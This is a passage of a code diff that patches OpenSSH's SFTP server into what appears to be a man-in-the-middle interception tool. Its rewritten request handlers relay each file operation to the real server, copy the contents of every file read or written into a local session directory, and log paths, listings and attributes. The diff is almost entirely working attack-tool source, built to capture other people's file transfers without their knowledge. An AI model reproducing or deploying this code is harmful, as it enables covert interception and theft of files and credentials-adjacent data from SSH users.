*fmt, ...);\n+void _sftp_log(u_int status, u_int do_xss_filtering, char *buf, int buf_len);\n+void sftp_log_close(u_int status, char *handle_str, size_t handle_len);\n+void sftp_log_attrib(const char *func, u_int status, char *name, Attrib *a);\n+void sftp_log_handle_attrib(const char *func, u_int status, char *handle_str, size_t handle_len, Attrib *a);\n+void sftp_log_readdir(char *handle_str, size_t handle_len, char *listing);\n+void sftp_log_statvfs(u_int status, char *path, struct statvfs *st);\n+void sftp_log_fstatvfs(u_int status, char *handle_str, size_t handle_len, struct statvfs *st);\n+void sftp_log_fsync(u_int status, char *handle_str, size_t handle_len);\n+void xss_sanitize(char *buf, int buf_len);\n+\n+/* The error message for functions that search for file handles. */\n+#define CANT_FIND_HANDLE \"MITM: %s: can't find handle!\"\n+\n struct sftp_handler {\n \tconst char *name;\t/* user-visible name for fine-grained perms */\n \tconst char *ext_name;\t/* extended request name */\n@@ -179,6 +231,7 @@\n \treturn 1;\n }\n \n+/*\n static int\n errno_to_portable(int unixerrno)\n {\n@@ -236,7 +289,7 @@\n \t\tflags |= O_EXCL;\n \treturn flags;\n }\n-\n+*/\n static const char *\n string_from_portable(int pflags)\n {\n@@ -266,6 +319,7 @@\n \treturn ret;\n }\n \n+\n /* handle handles */\n \n typedef struct Handle Handle;\n@@ -289,6 +343,195 @@\n u_int num_handles = 0;\n int first_unused_handle = -1;\n \n+\n+/* Frees a handle slot and re-initializes it. */\n+void mitm_handle_free(MITMHandle *mh) {\n+  if (mh != NULL) {\n+    free(mh->handle_str);\n+    free(mh->original_path);\n+    free(mh->actual_path);\n+    free(mh->file_listing);\n+    mitm_handle_init(mh);\n+  }\n+}\n+\n+/* Initializes a handle slot. Use mitm_handle_free() on previously-occupied\n+ * slots. */\n+void mitm_handle_init(MITMHandle *mh) {\n+  if (mh != NULL) {\n+    mh->in_use = 0;\n+    mh->type = 0;\n+    mh->handle_str = NULL;\n+    mh->handle_len = 0;\n+    mh->fd = -1;\n+    mh->pflags = 0;\n+    mh->original_path = NULL;\n+    mh->actual_path = NULL;\n+    mh->file_listing = NULL;\n+    mh->file_listing_size = 0;\n+  }\n+}\n+\n+/* Adds a new handle, given its type (MITM_HANDLE_TYPE_{FILE,DIR}), original\n+ * path, open flags, and remote server handle. */\n+void mitm_handle_new(u_int type, char *original_path, u_int32_t pflags, const char *handle_str, size_t handle_len) {\n+  int unused_handle = -1, actual_path_len = 0;;\n+  u_int i = 0, num_tries = 0, r = 0;\n+  char file_path[PATH_MAX];\n+  char *file_prefix = NULL, *temp_name = NULL, *log_dir = NULL;\n+\n+  /* On first invokation, the mitm_handles array is unallocated. */\n+  if (mitm_handles == NULL) {\n+    if ((mitm_handles = reallocarray(NULL, MITM_HANDLES_NEW_BLOCK, sizeof(MITMHandle))) == NULL)\n+      fatal(\"Could not allocate array for MITMHandles.\");\n+\n+    num_mitm_handles = MITM_HANDLES_NEW_BLOCK;\n+\n+    /* Initializes all the slots. */\n+    for (i = 0; i < num_mitm_handles; i++)\n+      mitm_handle_init(&mitm_handles[i]);\n+\n+    /* Since we just allocated a new array, we know slot 0 is unoccupied. */\n+    unused_handle = 0;\n+  }\n+\n+  /* Sequentially search for an unused slot in the array. */\n+  for (i = 0; (i < num_mitm_handles) && (unused_handle == -1); i++) {\n+    /* If we found one, save its slot index. */\n+    if (mitm_handles[i].in_use == 0)\n+      unused_handle = i;\n+  }\n+\n+  /* If, after searching the entire array, we haven't found an open slot, we\n+   * must grow the array. */\n+  if (unused_handle == -1) {\n+    unused_handle = num_mitm_handles;\n+\n+    /* Make the array bigger by one block size. */\n+    num_mitm_handles += MITM_HANDLES_NEW_BLOCK;\n+    if ((mitm_handles = reallocarray(mitm_handles, num_mitm_handles, sizeof(MITMHandle))) == NULL)\n+      fatal(\"Could not allocate array for MITMHandles.\");\n+\n+    /* Initialize the slots we just expanded. */\n+    for (; i < num_mitm_handles; i++)\n+      mitm_handle_init(&mitm_handles[i]);\n+  }\n+\n+  /* Mark this slot as being in use. */\n+  mitm_handles[unused_handle].in_use = 1;\n+\n+  /* Set the file/directory flag. */\n+  mitm_handles[unused_handle].type = type;\n+\n+  /* Allocate a buffer for the remote server handle data, then copy it. */\n+  if ((mitm_handles[unused_handle].handle_str = xmalloc(handle_len)) == NULL)\n+    fatal(\"Could not allocate array for handle string.\");\n+  memcpy(mitm_handles[unused_handle].handle_str, handle_str, handle_len);\n+\n+  /* Set the handle length. */\n+  mitm_handles[unused_handle].handle_len = handle_len;\n+\n+  /* Copy the original full path of the file being opened on the remote\n+   * server, and do XSS filtering on it. */\n+  mitm_handles[unused_handle].original_path = xstrdup(original_path);\n+  xss_sanitize(mitm_handles[unused_handle].original_path, strlen(mitm_handles[unused_handle].original_path));\n+\n+  /* Save the portable flags its being opened with. */\n+  mitm_handles[unused_handle].pflags = pflags;\n+\n+  /* If this is a file, find a unique local filename, and open a handle to\n+   * it. */\n+  if (type == MITM_HANDLE_TYPE_FILE) {\n+\n+    /* Extract the filename of the path. */\n+    temp_name = xstrdup(original_path);\n+    file_prefix = basename(temp_name);\n+\n+    /* Ensure that a relative path wasn't snuck in. */\n+    if ((memmem(file_prefix, strlen(file_prefix), \"..\", 2) != NULL) || (memmem(file_prefix, strlen(file_prefix), \"/\", 1) != NULL))\n+      file_prefix = \"file\";\n+\n+    /* Construct a path to save the file to locally, such as\n+     * \"/home/ssh-mitm/sftp_session_0/lol.txt\". */\n+    snprintf(file_path, sizeof(file_path) - 1, \"%s%s\", session_log_dir, file_prefix);\n+\n+    /* Find a unique local filename. */\n+    while (mitm_handles[unused_handle].fd < 0) {\n+      mitm_handles[unused_handle].fd = open(file_path, O_CREAT | O_EXCL | O_NOATIME | O_NOFOLLOW | O_WRONLY, S_IRUSR | S_IWUSR);\n+\n+      num_tries++;\n+\n+      /* If open() failed, append \"_X\" to the file path, where X is an\n+       * incrementing integer. */\n+      if (mitm_handles[unused_handle].fd < 0) {\n+\tsnprintf(file_path, sizeof(file_path) - 1, \"%s%s_%u\", session_log_dir, file_prefix, num_tries);\n+      }\n+    }\n+    free(temp_name); temp_name = NULL;\n+\n+    /* Get the base name of our log directory.  Because we're using GNU\n+     * basename(), we need to cut off the trailing slash, otherwise we get back\n+     * the empty string.\n+     *\n+     * \"/home/ssh-mitm/sftp_session_0/\" -> \"sftp_session_0\" */\n+    temp_name = xstrdup(session_log_dir);\n+    if (strlen(temp_name) > 0)\n+      temp_name[strlen(temp_name) - 1] = '\\0';\n+    log_dir = basename(temp_name);\n+\n+    /* Get the basename of the file we wrote.\n+     * \"/home/ssh-mitm/sftp_session_0/lol.txt\" -> \"lol.txt\" */\n+    file_prefix = basename(file_path);\n+    actual_path_len = strlen(log_dir) + 1 + strlen(file_prefix) + 1;\n+    mitm_handles[unused_handle].actual_path = calloc(actual_path_len, sizeof(char));\n+\n+    /* Create the relative path, i.e.: \"sftp_session_0/lol.txt\". */\n+    r = snprintf(mitm_handles[unused_handle].actual_path, actual_path_len, \"%s/%s\", log_dir, file_prefix);\n+    xss_sanitize(mitm_handles[unused_handle].actual_path, r);\n+\n+    free(temp_name); temp_name = NULL;\n+  }\n+}\n+\n+/* Write discovered data to our local file.  We do this for both remote server\n+ * reads and writes. */\n+void mitm_handle_read_write(char *handle_str, size_t handle_len, u_int64_t offset, u_char *buf, size_t buf_len) {\n+  MITMHandle *mh = NULL;\n+\n+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {\n+    lseek(mh->fd, offset, SEEK_SET);\n+    write(mh->fd, buf, buf_len);\n+  } else\n+    logit(CANT_FIND_HANDLE, __func__);\n+}\n+\n+/* Close the local file descriptor associated with this remote server handle.\n+ * Frees the slot this handle is in. */\n+void mitm_handle_close(const char *handle_str, size_t handle_len) {\n+  MITMHandle *mh = NULL;\n+\n+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {\n+    close(mh->fd);\n+    mitm_handle_free(mh);\n+  } else\n+    logit(CANT_FIND_HANDLE, __func__);\n+}\n+\n+/* Searches for an MITMHandle, given its remote server handle and length.\n+ * Returns a pointer to it on success, or NULL if it could not be found. */\n+MITMHandle *mitm_handle_search(const char *handle_str, size_t handle_len) {\n+  u_int i = 0;\n+\n+  for (i = 0; i < num_mitm_handles; i++) {\n+    if ((mitm_handles[i].in_use == 1) && (mitm_handles[i].handle_len == handle_len) && (memcmp(mitm_handles[i].handle_str, handle_str, handle_len) == 0)) {\n+      return &mitm_handles[i];\n+    }\n+  }\n+  return NULL;\n+}\n+\n+\n+/*\n static void handle_unused(int i)\n {\n \thandles[i].use = HANDLE_UNUSED;\n@@ -321,6 +564,7 @@\n \n \treturn i;\n }\n+*/\n \n static int\n handle_is_ok(int i, int type)\n@@ -328,6 +572,7 @@\n \treturn i >= 0 && (u_int)i < num_handles && handles[i].use == type;\n }\n \n+/*\n static int\n handle_to_string(int handle, u_char **stringp, int *hlenp)\n {\n@@ -338,6 +583,7 @@\n \t*hlenp = sizeof(int32_t);\n \treturn 0;\n }\n+*/\n \n static int\n handle_from_string(const u_char *handle, u_int hlen)\n@@ -362,6 +608,7 @@\n \treturn NULL;\n }\n \n+/*\n static DIR *\n handle_to_dir(int handle)\n {\n@@ -399,6 +646,7 @@\n \tif (handle_is_ok(handle, HANDLE_FILE) && bytes > 0)\n \t\thandles[handle].bytes_write += bytes;\n }\n+*/\n \n static u_int64_t\n handle_bytes_read(int handle)\n@@ -416,6 +664,7 @@\n \treturn 0;\n }\n \n+/*\n static int\n handle_close(int handle)\n {\n@@ -434,6 +683,7 @@\n \t}\n \treturn ret;\n }\n+*/\n \n static void\n handle_log_close(int handle, char *emsg)\n@@ -461,6 +711,7 @@\n \t\t\thandle_log_close(i, \"forced\");\n }\n \n+/*\n static int\n get_handle(struct sshbuf *queue, int *hp)\n {\n@@ -476,6 +727,28 @@\n \tfree(handle);\n \treturn 0;\n }\n+*/\n+\n+/* Handle return value must be free()'ed. */\n+int\n+get_handle_all(struct sshbuf *queue, u_char **handle_str, size_t *handle_len, int *handle_int)\n+{\n+\tint r;\n+\n+\tif ((r = sshbuf_get_string(queue, handle_str, handle_len)) != 0)\n+\t  return r;\n+\n+\tif (*handle_len < 256)\n+\t\t*handle_int = handle_from_string(*handle_str, *handle_len);\n+\telse {\n+\t\tfree(*handle_str); *handle_str = NULL;\n+\t\t*handle_len = 0;\n+\t\t*handle_int = -1;\n+\t\treturn -1;\n+\t}\n+\n+\treturn 0;\n+}\n \n /* send replies */\n \n@@ -555,6 +828,7 @@\n \tsend_data_or_handle(SSH2_FXP_DATA, id, data, dlen);\n }\n \n+/*\n static void\n send_handle(u_int32_t id, int handle)\n {\n@@ -566,6 +840,15 @@\n \tsend_data_or_handle(SSH2_FXP_HANDLE, id, string, hlen);\n \tfree(string);\n }\n+*/\n+\n+static void\n+send_handle_str(u_int32_t id, u_char *handle, size_t handle_len)\n+{\n+\tdebug(\"request %u: sent handle_str handle %d\", id, atoi(handle));\n+\tsend_data_or_handle(SSH2_FXP_HANDLE, id, handle, handle_len);\n+}\n+\n \n static void\n send_names(u_int32_t id, int count, const Stat *stats)\n@@ -678,14 +961,18 @@\n \tu_int32_t pflags;\n \tAttrib a;\n \tchar *name;\n-\tint r, handle, fd, flags, mode, status = SSH2_FX_FAILURE;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n+\tu_int status = 0;\n+\tint r;\n \n \tif ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0 ||\n \t    (r = sshbuf_get_u32(iqueue, &pflags)) != 0 || /* portable flags */\n \t    (r = decode_attrib(iqueue, &a)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \n-\tdebug3(\"request %u: open flags %d\", id, pflags);\n+\tdebug3(\"request %u: open \\\"%s\\\" flags %d\", id, name, pflags);\n+\t/*\n \tflags = flags_from_portable(pflags);\n \tmode = (a.flags & SSH2_FILEXFER_ATTR_PERMISSIONS) ? a.perm : 0666;\n \tlogit(\"open \\\"%s\\\" flags %s mode 0%o\",\n@@ -711,12 +998,25 @@\n \t}\n \tif (status != SSH2_FX_OK)\n \t\tsend_status(id, status);\n+\t*/\n+\thandle_str = mitm_do_open(client_conn, name, pflags, &a, &handle_len, &status);\n+\tif (handle_str != NULL) {\n+\t\tdebug3(\"request %u: open \\\"%s\\\" returning handle: %d\", id, name, handle_from_string(handle_str, handle_len));\n+\t\tsend_handle_str(id, handle_str, handle_len);\n+\t\tmitm_handle_new(MITM_HANDLE_TYPE_FILE, name, pflags, handle_str, handle_len);\n+\t} else {\n+\t\tsend_status(id, status);\n+\t\tsftp_log(status, \"open \\\"%s\\\" (Flags: %s)\", name, string_from_portable(pflags));\n+\t}\n+\n+\tfree(handle_str);  handle_str = NULL;\n \tfree(name);\n }\n \n static void\n process_close(u_int32_t id)\n {\n+\t/*\n \tint r, handle, ret, status = SSH2_FX_FAILURE;\n \n \tif ((r = get_handle(iqueue, &handle)) != 0)\n@@ -727,11 +1027,28 @@\n \tret = handle_close(handle);\n \tstatus = (ret == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n \tsend_status(id, status);\n+\t*/\n+\tint r;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n+\tint handle_int = -1;\n+\tint status;\n+\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tdebug3(\"request %u: close handle %u\", id, handle_int);\n+\tstatus = mitm_do_close(client_conn, handle_str, handle_len);\n+\tsend_status(id, status);\n+\n+\tsftp_log_close(status, handle_str, handle_len);\n+\tmitm_handle_close(handle_str, handle_len);\n+\tfree(handle_str); handle_str = NULL;\n }\n \n static void\n process_read(u_int32_t id)\n {\n+\t/*\n \tu_char buf[64*1024];\n \tu_int32_t len;\n \tint r, handle, fd, ret, status = SSH2_FX_FAILURE;\n@@ -768,11 +1085,39 @@\n \t}\n \tif (status != SSH2_FX_OK)\n \t\tsend_status(id, status);\n+\t*/\n+\tint r;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n+\tint handle_int = -1;\n+\tu_int32_t read_len;\n+\tu_int64_t offset;\n+\tu_int status = 0;\n+\tu_char *buf = NULL;\n+\tsize_t buf_len = 0;\n+\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||\n+\t    (r = sshbuf_get_u64(iqueue, &offset)) != 0 ||\n+\t    (r = sshbuf_get_u32(iqueue, &read_len)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug3(\"request %u: read (handle %d) off %llu len %d\",\n+\t    id, handle_int, (unsigned long long)offset, read_len);\n+\tbuf = mitm_do_read(client_conn, handle_str, handle_len, offset, read_len, &buf_len, &status);\n+\tif (buf != NULL) {\n+\t\tsend_data(id, buf, buf_len);\n+\t\tmitm_handle_read_write(handle_str, handle_len, offset, buf, buf_len);\n+\t} else\n+\t\tsend_status(id, status);\n+\n+\tfree(buf); buf = NULL;\n+\tfree(handle_str); handle_str = NULL;\n }\n \n static void\n process_write(u_int32_t id)\n {\n+\t/*\n \tu_int64_t off;\n \tsize_t len;\n \tint r, handle, fd, ret, status;\n@@ -795,7 +1140,9 @@\n \t\t\tstatus = errno_to_portable(errno);\n \t\t\terror(\"process_write: seek failed\");\n \t\t} else {\n+\t*/\n /* XXX ATOMICIO ? */\n+\t/*\n \t\t\tret = write(fd, data, len);\n \t\t\tif (ret < 0) {\n \t\t\t\terror(\"process_write: write failed\");\n@@ -811,21 +1158,44 @@\n \t}\n \tsend_status(id, status);\n \tfree(data);\n+\t*/\n+\tint r;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n+\tint handle_int = -1;\n+\tu_int64_t offset;\n+\tu_int status;\n+\tu_char *buf = NULL;\n+\tsize_t buf_len = 0;\n+\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||\n+\t    (r = sshbuf_get_u64(iqueue, &offset)) != 0 ||\n+\t    (r = sshbuf_get_string(iqueue, &buf, &buf_len)) != 0)\n+\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tdebug3(\"request %u: write (handle %d) off %llu len %zu\",\n+\t    id, handle_int, (unsigned long long)offset, buf_len);\n+\tstatus = mitm_do_write(client_conn, handle_str, handle_len, offset, buf, buf_len);\n+\tmitm_handle_read_write(handle_str, handle_len, offset, buf, buf_len);\n+\tsend_status(id, status);\n+\n+\tfree(handle_str); handle_str = NULL;\n+\tfree(buf); buf = NULL;\n }\n \n static void\n-process_do_stat(u_int32_t id, int do_lstat)\n+process_do_stat(u_int32_t id, int do_lstat_arg)\n {\n-\tAttrib a;\n-\tstruct stat st;\n \tchar *name;\n \tint r, status = SSH2_FX_FAILURE;\n+\tAttrib *b;\n \n \tif ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \n-\tdebug3(\"request %u: %sstat\", id, do_lstat ? \"l\" : \"\");\n-\tverbose(\"%sstat name \\\"%s\\\"\", do_lstat ? \"l\" : \"\", name);\n+\tdebug3(\"request %u: %sstat\", id, do_lstat_arg ? \"l\" : \"\");\n+\tverbose(\"%sstat name \\\"%s\\\"\", do_lstat_arg ? \"l\" : \"\", name);\n+\t/*\n \tr = do_lstat ? lstat(name, &st) : stat(name, &st);\n \tif (r < 0) {\n \t\tstatus = errno_to_portable(errno);\n@@ -836,6 +1206,18 @@\n \t}\n \tif (status != SSH2_FX_OK)\n \t\tsend_status(id, status);\n+\t*/\n+\tif (do_lstat_arg) \n+\t\tb = do_lstat(client_conn, name, 0, &status);\n+\telse\n+\t\tb = do_stat(client_conn, name, 0, &status);\n+\n+\tif (b != NULL)\n+\t\tsend_attrib(id, b);\n+\telse\n+\t\tsend_status(id, status);\n+\n+\tsftp_log_attrib(do_lstat_arg ? \"lstat\" : \"stat\", status, name, b);\n \tfree(name);\n }\n \n@@ -854,10 +1236,14 @@\n static void\n process_fstat(u_int32_t id)\n {\n-\tAttrib a;\n-\tstruct stat st;\n-\tint fd, r, handle, status = SSH2_FX_FAILURE;\n+\tAttrib *a;\n+\tint status = SSH2_FX_FAILURE;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n+\tint handle_int = -1;\n+\tint r;\n \n+\t/*\n \tif ((r = get_handle(iqueue, &handle)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \tdebug(\"request %u: fstat \\\"%s\\\" (handle %u)\",\n@@ -875,8 +1261,22 @@\n \t}\n \tif (status != SSH2_FX_OK)\n \t\tsend_status(id, status);\n+\t*/\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug3(\"request %u: fstat (handle %u)\", id, handle_int);\n+\ta = mitm_do_fstat(client_conn, handle_str, handle_len, 1, &status);\n+\tif (a != NULL)\n+\t\tsend_attrib(id, a);\n+\telse\n+\t\tsend_status(id, status);\n+\n+\tsftp_log_handle_attrib(\"fstat\", status, handle_str, handle_len, a);\n+\tfree(handle_str);  handle_str = NULL;\n }\n \n+/*\n static struct timeval *\n attrib_to_tv(const Attrib *a)\n {\n@@ -888,6 +1288,7 @@\n \ttv[1].tv_usec = 0;\n \treturn tv;\n }\n+*/\n \n static void\n process_setstat(u_int32_t id)\n@@ -900,7 +1301,8 @@\n \t    (r = decode_attrib(iqueue, &a)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \n-\tdebug(\"request %u: setstat name \\\"%s\\\"\", id, name);\n+\tdebug3(\"request %u: setstat name \\\"%s\\\"\", id, name);\n+\t/*\n \tif (a.flags & SSH2_FILEXFER_ATTR_SIZE) {\n \t\tlogit(\"set \\\"%s\\\" size %llu\",\n \t\t    name, (unsigned long long)a.size);\n@@ -932,7 +1334,11 @@\n \t\tif (r == -1)\n \t\t\tstatus = errno_to_portable(errno);\n \t}\n+\t*/\n+\tstatus = mitm_do_setstat(client_conn, name, &a);\n \tsend_status(id, status);\n+\n+\tsftp_log_attrib(\"setstat\", status, name, &a);\n \tfree(name);\n }\n \n@@ -940,9 +1346,13 @@\n process_fsetstat(u_int32_t id)\n {\n \tAttrib a;\n-\tint handle, fd, r;\n \tint status = SSH2_FX_OK;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n+\tint handle_int = -1;\n+\tint r;\n \n+\t/*\n \tif ((r = get_handle(iqueue, &handle)) != 0 ||\n \t    (r = decode_attrib(iqueue, &a)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n@@ -998,12 +1408,23 @@\n \t\t\t\tstatus = errno_to_portable(errno);\n \t\t}\n \t}\n+\t*/\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||\n+\t    (r = decode_attrib(iqueue, &a)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug3(\"request %u: fsetstat handle %d\", id, handle_int);\n+\tstatus = mitm_do_fsetstat(client_conn, handle_str, handle_len, &a);\n \tsend_status(id, status);\n+\n+\tsftp_log_handle_attrib(\"fsetstat\", status, handle_str, handle_len, &a);\n+\tfree(handle_str);  handle_str = NULL;\n }\n \n static void\n process_opendir(u_int32_t id)\n {\n+\t/*\n \tDIR *dirp = NULL;\n \tchar *path;\n \tint r, handle, status = SSH2_FX_FAILURE;\n@@ -1028,12 +1449,31 @@\n \t}\n \tif (status != SSH2_FX_OK)\n \t\tsend_status(id, status);\n+\t*/\n+\tint r, status = SSH2_FX_FAILURE;\n+\tchar *path;\n+\tif ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug(\"request %u: opendir \\\"%s\\\"\", id, path);\n+\n+\tsize_t handle_len = 0;\n+\tu_char *handle_str = mitm_do_opendir(client_conn, path, &handle_len, &status);\n+\tif (handle_str != NULL) {\n+\t\tdebug(\"request %u: opendir \\\"%s\\\" returning handle: %u\", id, path, handle_from_string(handle_str, handle_len));\n+\t\tsend_handle_str(id, handle_str, handle_len);\n+\t\tmitm_handle_new(MITM_HANDLE_TYPE_DIR, path, 0, handle_str, handle_len);\n+\t} else\n+\t\tsend_status(id, status);\n+\n+\tfree(handle_str);  handle_str = NULL;\n \tfree(path);\n }\n \n static void\n process_readdir(u_int32_t id)\n {\n+\t/*\n \tDIR *dirp;\n \tstruct dirent *dp;\n \tchar *path;\n@@ -1060,7 +1500,9 @@\n \t\t\t\tnstats *= 2;\n \t\t\t\tstats = xreallocarray(stats, nstats, sizeof(Stat));\n \t\t\t}\n+\t*/\n /* XXX OVERFLOW ? */\n+\t/*\n \t\t\tsnprintf(pathname, sizeof pathname, \"%s%s%s\", path,\n \t\t\t    strcmp(path, \"/\") ? \"/\" : \"\", dp->d_name);\n \t\t\tif (lstat(pathname, &st) < 0)\n@@ -1069,8 +1511,10 @@\n \t\t\tstats[count].name = xstrdup(dp->d_name);\n \t\t\tstats[count].long_name = ls_file(dp->d_name, &st, 0, 0);\n \t\t\tcount++;\n+\t*/\n \t\t\t/* send up to 100 entries in one message */\n \t\t\t/* XXX check packet size instead */\n+\t/*\n \t\t\tif (count == 100)\n \t\t\t\tbreak;\n \t\t}\n@@ -1085,6 +1529,32 @@\n \t\t}\n \t\tfree(stats);\n \t}\n+\t*/\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n+\tint handle_int = -1;\n+\tint r;\n+\tint status = 0;\n+\tu_int count = 0, i = 0;\n+\tStat *stats;\n+\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)\n+\t\tfatal(\"%s: buffer error\", __func__);\n+\n+\tdebug(\"request %u: readdir(handle %d)\", id, handle_int);\n+\tstats = mitm_do_readdir(client_conn, id, handle_str, handle_len, &count, &status);\n+\tif (stats == NULL)\n+\t\tsend_status(id, status);\n+\telse {\n+\t\tsend_names(id, count, stats);\n+\t\tfor (i = 0; i < count; i++) {\n+\t\t\tsftp_log_readdir(handle_str, handle_len, stats[i].long_name);\n+\t\t\tfree(stats[i].name); stats[i].name = NULL;\n+\t\t\tfree(stats[i].long_name); stats[i].long_name = NULL;\n+\t\t}\n+\t\tfree(stats); stats = NULL;\n+\t}\n+\tfree(handle_str); handle_str = NULL;\n }\n \n static void\n@@ -1098,9 +1568,15 @@\n \n \tdebug3(\"request %u: remove\", id);\n \tlogit(\"remove name \\\"%s\\\"\", name);\n+\t/*\n \tr = unlink(name);\n \tstatus = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n \tsend_status(id, status);\n+\t*/\n+\tstatus = mitm_do_rm(client_conn, name);\n+\tsend_status(id, status);\n+\n+\tsftp_log(status, \"rm \\\"%s\\\"\", name);\n \tfree(name);\n }\n \n@@ -1119,9 +1595,15 @@\n \t    a.perm & 07777 : 0777;\n \tdebug3(\"request %u: mkdir\", id);\n \tlogit(\"mkdir name \\\"%s\\\" mode 0%o\", name, mode);\n+\t/*\n \tr = mkdir(name, mode);\n \tstatus = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n \tsend_status(id, status);\n+\t*/\n+\tstatus = mitm_do_mkdir(client_conn, name, &a);\n+\tsend_status(id, status);\n+\n+\tsftp_log(status, \"mkdir \\\"%s\\\" (mode: 0%o)\", name, mode);\n \tfree(name);\n }\n \n@@ -1136,18 +1618,26 @@\n \n \tdebug3(\"request %u: rmdir\", id);\n \tlogit(\"rmdir name \\\"%s\\\"\", name);\n+\t/*\n \tr = rmdir(name);\n \tstatus = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n \tsend_status(id, status);\n+\t*/\n+\tstatus = mitm_do_rmdir(client_conn, name);\n+\tsend_status(id, status);\n+\n+\tsftp_log(status, \"rmdir \\\"%s\\\"\", name);\n \tfree(name);\n }\n \n static void\n process_realpath(u_int32_t id)\n {\n-\tchar resolvedname[PATH_MAX];\n \tchar *path;\n \tint r;\n+\tchar *realpath;\n+\tStat s;\n+\tu_int status;\n \n \tif ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n@@ -1158,6 +1648,7 @@\n \t}\n \tdebug3(\"request %u: realpath\", id);\n \tverbose(\"realpath \\\"%s\\\"\", path);\n+\t/*\n \tif (realpath(path, resolvedname) == NULL) {\n \t\tsend_status(id, errno_to_portable(errno));\n \t} else {\n@@ -1166,6 +1657,17 @@\n \t\ts.name = s.long_name = resolvedname;\n \t\tsend_names(id, 1, &s);\n \t}\n+\t*/\n+\trealpath = do_realpath(client_conn, path, &status);\n+\tif (status == SSH2_FX_OK) {\n+\t  attrib_clear(&s.attrib);\n+\t  s.name = s.long_name = realpath;\n+\t  send_names(id, 1, &s);\n+\t} else\n+\t  send_status(id, status);\n+\n+\tsftp_log(status, \"realpath \\\"%s\\\" (Result: %s)\", path, realpath != NULL ? realpath : \"(NULL)\");\n+\tfree(realpath); realpath = NULL;\n \tfree(path);\n }\n \n@@ -1174,7 +1676,6 @@\n {\n \tchar *oldpath, *newpath;\n \tint r, status;\n-\tstruct stat sb;\n \n \tif ((r = sshbuf_get_cstring(iqueue, &oldpath, NULL)) != 0 ||\n \t    (r = sshbuf_get_cstring(iqueue, &newpath, NULL)) != 0)\n@@ -1182,11 +1683,14 @@\n \n \tdebug3(\"request %u: rename\", id);\n \tlogit(\"rename old \\\"%s\\\" new \\\"%s\\\"\", oldpath, newpath);\n+\t/*\n \tstatus = SSH2_FX_FAILURE;\n \tif (lstat(oldpath, &sb) == -1)\n \t\tstatus = errno_to_portable(errno);\n \telse if (S_ISREG(sb.st_mode)) {\n+\t*/\n \t\t/* Race-free rename of regular files */\n+\t/*\n \t\tif (link(oldpath, newpath) == -1) {\n \t\t\tif (errno == EOPNOTSUPP || errno == ENOSYS\n #ifdef EXDEV\n@@ -1198,10 +1702,12 @@\n \t\t\t    ) {\n \t\t\t\tstruct stat st;\n \n+\t*/\n \t\t\t\t/*\n \t\t\t\t * fs doesn't support links, so fall back to\n \t\t\t\t * stat+rename.  This is racy.\n \t\t\t\t */\n+\t/*\n \t\t\t\tif (stat(newpath, &st) == -1) {\n \t\t\t\t\tif (rename(oldpath, newpath) == -1)\n \t\t\t\t\t\tstatus =\n@@ -1214,7 +1720,9 @@\n \t\t\t}\n \t\t} else if (unlink(oldpath) == -1) {\n \t\t\tstatus = errno_to_portable(errno);\n+\t*/\n \t\t\t/* clean spare link */\n+\t/*\n \t\t\tunlink(newpath);\n \t\t} else\n \t\t\tstatus = SSH2_FX_OK;\n@@ -1224,7 +1732,11 @@\n \t\telse\n \t\t\tstatus = SSH2_FX_OK;\n \t}\n+\t*/\n+\tstatus = mitm_do_rename(client_conn, oldpath, newpath, 1);\n \tsend_status(id, status);\n+\n+\tsftp_log(status, \"rename \\\"%s\\\" \\\"%s\\\"\", oldpath, newpath);\n \tfree(oldpath);\n \tfree(newpath);\n }\n@@ -1232,15 +1744,18 @@\n static void\n process_readlink(u_int32_t id)\n {\n-\tint r, len;\n-\tchar buf[PATH_MAX];\n+\tint r;\n \tchar *path;\n+\tu_int status = 0;\n+\tchar *filename = NULL, *long_name = NULL;\n+\tAttrib a;\n \n \tif ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \n \tdebug3(\"request %u: readlink\", 